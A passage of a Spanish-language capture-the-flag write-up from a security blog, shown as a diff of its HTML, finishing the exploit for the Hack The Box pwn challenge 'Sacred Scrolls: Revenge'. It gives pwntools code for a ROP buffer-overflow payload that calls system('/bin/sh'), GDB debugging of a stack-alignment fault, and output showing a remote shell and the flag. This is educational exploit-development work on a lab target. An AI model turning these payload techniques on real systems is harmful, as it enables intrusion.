+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">system_plt</span><span class="mtk1">)</span>
+</code></pre></div><p>Además, debemos ingresar el <em>payload</em> en un archivo llamado <code>spell.txt</code>, comprimirlo usando ZIP y codificar el resultado en Base64:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'spell.txt'</span><span class="mtk1">, </span><span class="mtk4">'wb'</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">'zip spell.zip spell.txt'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">'rm spell.txt'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'spell.zip'</span><span class="mtk1">, </span><span class="mtk4">'rb'</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">b64e</span><span class="mtk1">(</span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">read</span><span class="mtk1">()).</span><span class="mtk8">encode</span><span class="mtk1">()</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter file (it will be named spell.zip): '</span><span class="mtk1">, </span><span class="mtk1">data</span><span class="mtk1">)</span>  
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>Usando el código anterior, casi podemos terminar el <em>exploit</em>, porque no funciona correctamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './sacred_scrolls'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './sacred_scrolls': pid 3919915
+[<span class="code-blue">*</span>] "/bin/sh" address: 0x7f74ea3a5698
+  adding: spell.txt (deflated 53%)
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-red">[-] This spell is not quiet effective, thus it will not be saved!</span>  
+[<span class="code-blue">*</span>] Got EOF while reading in interactive
+<span class="code-red">$</span>
+</code></pre></div><h3 id="depurando-el-_exploit_">Depurando el <em>exploit</em></h3><p>Podemos adjuntar GDB al proceso utilizando esta sentencia:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span>, <span class="mtk4">'continue'</span><span class="mtk1">)</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './sacred_scrolls'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './sacred_scrolls': pid 3921036
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './sacred_scrolls', '3921036', '-x', '/tmp/pwnqm8ivbkx.gdb']  
+[<span class="code-blue">*</span>] "/bin/sh" address: 0x7f608722b698
+  adding: spell.txt (deflated 53%)
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-red">[-] This spell is not quiet effective, thus it will not be saved!</span>
+[<span class="code-blue">*</span>] Got EOF while reading in interactive
+<span class="code-red">$</span>
+</code></pre></div><p>Y en GDB el programa se detiene aquí (violación de segmento):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $rip
+=&gt; <span class="code-dark-blue">0x7f60870a3963</span>:      movaps XMMWORD PTR [rsp],xmm1  
+<span class="code-green">gef➤  </span>p/x $rsp
+$1 = 0x7ffd29fdf148
+</code></pre></div><p>Este problema se conoce como alineación de pila (<em>stack alignment</em>). Ocurre con instrucciones como <code>movaps</code>, que fallan si la pila no está alineada con una dirección múltiplo de 16 (que es lo mismo para decir que el último dígito hexadecimal de <code>$rsp</code> es un <code>0</code>). Para solucionar este problema, podemos agregar un simple <em>gadget</em> <code>ret</code> a nuestra cadena ROP, por lo que el puntero de la pila se incrementa en 8. Un gadget <code>ret</code> puede ser el mismo <em>gadget</em> <code>pop_rdi_ret</code> más uno, para tomar solo la instrucción <code>ret</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">pop_rdi_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">4011b3</span>
+<span class="mtk1">    </span><span class="mtk1">system_plt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">400820</span>
+
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xf0\x9f\x91\x93\xe2\x9a\xa1</span><span class="mtk4">'</span>  
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">33</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">system_plt</span><span class="mtk1">)</span>
+</code></pre></div><p>Y ahora funciona correctamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './sacred_scrolls'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './sacred_scrolls': pid 3924655
+[<span class="code-blue">*</span>] "/bin/sh" address: 0x7fda53402698
+  adding: spell.txt (deflated 56%)
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-red">[-] This spell is not quiet effective, thus it will not be saved!</span>  
+<span class="code-red">$</span> ls
+glibc  sacred_scrolls  solve.py  spell.txt  spell.zip
+</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Entonces, vamos a lanzarlo en remoto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 139.59.189.31:31177
+[<span class="code-blue">*</span>] './sacred_scrolls'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Opening connection to 139.59.189.31 on port 31177: Done
+[<span class="code-blue">*</span>] "/bin/sh" address: 0x7f5345a86698
+updating: spell.txt (deflated 56%)
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-red">[-] This spell is not quiet effective, thus it will not be saved!</span>  
+<span class="code-red">$</span> ls
+flag.txt
+glibc
+sacred_scrolls
+spell.txt
+spell.zip
+<span class="code-red">$</span> cat flag.txt
+HTB{s1gn3ed_sp3ll5_fr0m_th3_b01_wh0_l1v3d}
+</code></pre></div><p>El <em>exploit</em> completo está aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Sacred%20Scrolls:%20Revenge/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#opción-para-subir-archivos">Opción para subir archivos</a></li><li><a href="#opción-para-leer-archivos">Opción para leer archivos</a></li><li><a href="#opción-para-guardar-archivo">Opción para guardar archivo</a></li><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#depurando-el-_exploit_">Depurando el <em>exploit</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
